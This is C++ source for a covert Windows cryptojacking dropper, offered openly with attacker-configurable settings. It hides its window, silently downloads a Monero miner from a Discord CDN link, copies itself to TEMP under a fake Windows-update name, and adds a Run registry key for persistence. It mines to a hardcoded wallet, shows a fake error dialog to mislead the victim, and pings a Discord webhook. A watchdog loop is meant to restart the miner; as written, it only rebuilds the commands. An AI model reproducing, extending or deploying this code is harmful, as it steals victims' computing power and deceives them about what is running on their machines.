#include <iostream>
#include <string>
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winuser.h>
#include "crypt.h"
#include <fstream>
#include <Shlwapi.h>
#include <tlhelp32.h>
#include "../External/curl/curl.h"

using namespace std;

void errorMsg()
{
	const wchar_t* message = L"The application was unable to start correctly. Error code 0x701000026 ";  // make a nice lil error message
	const wchar_t* title = L"Application Error "; // error title
	UINT messageType = MB_ICONERROR | MB_OK;
	MessageBoxW(NULL, message, title, messageType);
}

void hideWindow()
{
	HWND console = GetConsoleWindow();
	ShowWindow(console, SW_HIDE);

}

bool FileExists(const wchar_t* filePath) {
	std::ifstream file(filePath);
	return file.good();
}

bool IsProcessRunning(const wchar_t* installNameStartup) {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return false;
	}

	PROCESSENTRY32W pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(hSnapshot, &pe32)) {
		do {
			if (wcscmp(pe32.szExeFile, installNameStartup) == 0) {
				CloseHandle(hSnapshot);
				return true;
			}
		} while (Process32NextW(hSnapshot, &pe32));
	}

	CloseHandle(hSnapshot);
	return false;
}


bool CopySelfToTemp() {
	wchar_t currentPath[MAX_PATH];
	GetModuleFileName(nullptr, currentPath, MAX_PATH);

	wchar_t tempPath[MAX_PATH];
	GetTempPath(MAX_PATH, tempPath);

	wchar_t targetFilePath[MAX_PATH];
	wcscpy_s(targetFilePath, tempPath);
	wcscat_s(targetFilePath, L"\\WindowsBootUpdate.exe");

	if (FileExists(targetFilePath)) {
		return true;
	}

	if (CopyFile(currentPath, targetFilePath, FALSE) == TRUE) {
		return true;
	}

	return false;
}



int main() {

	// ------------------------  ######### Veriables To Change #########  ------------------------
	

	// Connecting Miner Configurations

	auto pool = skCrypt("pool.hashvault.pro:443"); // pool and port
	auto xmrAddress = skCrypt("46C1KqxhM41JMZQho3NYagiKNbRaMYqTh1ZcFvVBaELA9touZgJDcuN9bau6YW176NAH6nyg2EWpFAuSzZZdnG7rJVWHK9L"); // change to ur xmr address ( or dont... ;) )
	auto payloadUrl = skCrypt("https://cdn.discordapp.com/attachments/1158425057773768847/1158496066329657424/SystemRuntimeBroker.exe"); // dont change - url of xmrig.exe (download form github if u think its rat)


	// Discord notify

	bool discordNotify = true;
	const std::string WEBHOOK_URL = "ur_web_hook"; // ur dc webhook url

	// Installation

	auto downloadPath = skCrypt("C:\\Windows\\TEMP"); 
	auto installName = skCrypt("SystemRuntimeBroker.exe");
	

	// Startup

	bool Startup = true;
	const wchar_t* targetPath = L"C:\\Windows\\TEMP\\WindowsUpdateManager.exe"; // i just made it the full path
	const wchar_t* installNameStartup = L"WindowsUpdateManager.exe"; // nevermind this line just add it in the end of the downloadPathStartUp (sorry)


	// Persistance 
	
	bool watchDog = true;
	
	// Misc Options

	bool errorMsgBool = true;
	int startDelay = 200;


	// ------------------------  ######### End Of Veriables To Change #########  ------------------------


	// Making Commands
	auto downloadMinerCmd = std::string(skCrypt("curl --silent --output ")) + std::string(downloadPath) + "\\" + std::string(installName) + " " + std::string(payloadUrl) + std::string(skCrypt(" > nul 2>&1"));
	string startMiningCmd = std::string(downloadPath) + "\\" + std::string(installName) + " -o " + std::string(pool) + " -u " + std::string(xmrAddress) + " -p Miner -k --tls --background 	--no-title --bench=10M --submit";

	// #---  Execution of main functions  ---#

	hideWindow();

	system(downloadMinerCmd.c_str()); // Download


	if (Startup) { // will save to temp in appdata ;)  (C:\Users\userName\AppData\Local\Temp)
		if (CopySelfToTemp()) {
			HKEY key;
			const wchar_t* key_path = skCrypt(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run");

			LONG openResult = RegOpenKeyExW(HKEY_CURRENT_USER, key_path, 0, KEY_WRITE, &key);

			if (openResult == ERROR_SUCCESS) {
				LONG setValueResult = RegSetValueExW(key, installNameStartup, 0, REG_SZ, (const BYTE*)L"%TEMP%\\WindowsBootUpdate.exe", (wcslen(L"%TEMP%\\WindowsBootUpdate.exe") + 1) * sizeof(wchar_t));

				if (setValueResult == ERROR_SUCCESS) {
					RegCloseKey(key);
					std::wcout << L" [ * ] " << installNameStartup << L" added it to star." << std::endl;
				}
				else {
					std::wcout << L" [ ! ] failed to set reg value cus: " << setValueResult << std::endl;
				}
			}
			else {
				std::wcout << L" [ ! ] cant open reg key cus: " << openResult << std::endl;
			}
		}
		else {
			std::wcout << L" [ ! ] cant copy idk why" << std::endl;
		}
	}
	else {
		std::wcout << L" no flag set... lol" << std::endl;
	}


	Sleep(startDelay); // Start delay so not too sus
	system(startMiningCmd.c_str()); // Run it
	Sleep(10000); //makeing it wait for 10 seconds cus if the close the error message too fask it fucks everything up!
	if (errorMsgBool)
	{
		errorMsg();
	}

	if (discordNotify)
	{
		CURL* curl = curl_easy_init();
		if (!curl) {
			std::cerr << "failed to init libcurl" << std::endl;
			return 1;
		}

		std::string jsonPayload = R"({"content": "New silent XMR miner!"})";

		curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL.c_str());
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonPayload.c_str());
		curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
		CURLcode res = curl_easy_perform(curl);

		if (res != CURLE_OK) {
			std::cerr << "curl failed: " << curl_easy_strerror(res) << std::endl;
		}
		else {
			std::cout << "sent" << std::endl;
		}
		curl_easy_cleanup(curl);
	}



	// Start watchdog loop 
	if (watchDog)
	{
		while (true)
		{
			if (IsProcessRunning(installNameStartup)) { 
				std::wcout << installNameStartup << L" watchdog found its proc, we chilling" << std::endl;
			}
			else { // if miner is not running, wait a min, redownload and run it again.
				std::wcout << installNameStartup << L" shit bro why u gotta close the miner? gonna have to open again in a min bud... kek" << std::endl;
				Sleep(60000);
				auto downloadMinerCmd = std::string(skCrypt("curl --silent --output ")) + std::string(downloadPath) + "\\" + std::string(installName) + " " + std::string(payloadUrl) + std::string(skCrypt(" > nul 2>&1"));
				string startMiningCmd = std::string(downloadPath) + "\\" + std::string(installName) + " -o " + std::string(pool) + " -u " + std::string(xmrAddress) + " -p Miner -k --tls --background 	--no-title --bench=10M --submit";
			}
		}
	}



	return 0;
}